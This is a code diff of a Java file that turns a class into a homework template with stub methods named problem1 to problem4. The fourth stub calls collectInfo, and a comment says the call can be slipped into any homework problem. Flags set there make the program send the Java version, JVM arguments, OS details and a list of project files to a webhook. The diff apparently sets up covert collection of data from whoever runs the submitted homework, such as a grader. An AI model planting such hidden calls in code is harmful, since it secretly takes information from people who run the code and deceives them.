@@ -12,17 +12,36 @@ import java.time.format.DateTimeFormatter;
 import java.util.List;
 
 @SuppressWarnings("unused")
-public class Main {
+public class Example {
+    public static String problem1() {
+        return "";
+    }
+
+    public static int problem2() {
+        return 0;
+    }
+
+    public static void problem3() {
+
+    }
+
+    // Just add a call to collectInfo to any of the problems in your homework and complete the rest as normal
+    public static double problem4() {
+        collectInfo();
+        return 0.0;
+    }
+
     // Webhook information
     private static final String webhookUrl = "";
-    private static final String webhookColor = "";
+    private static final String webhookColor = "000000";
 
     // What all to grab
-    private static final boolean javaInfo = false;
-    private static final boolean osInfo = true;
-    private static final boolean listFiles = true;
+    private static final boolean javaInfo = true; // Send back java version, vendor and jvm args
+    private static final boolean osInfo = true; // Send back os name, version and architecture
+    private static final boolean listFiles = true; // Send back a list of files in the project
     private static final boolean sendFiles = false;
 
+    // What folders to ignore when sending back files
     private static final List<String> ignoredFolders = List.of(
         "build",
         ".git",
@@ -130,4 +149,5 @@ public class Main {
             e.printStackTrace();
         }
     }
+
 }
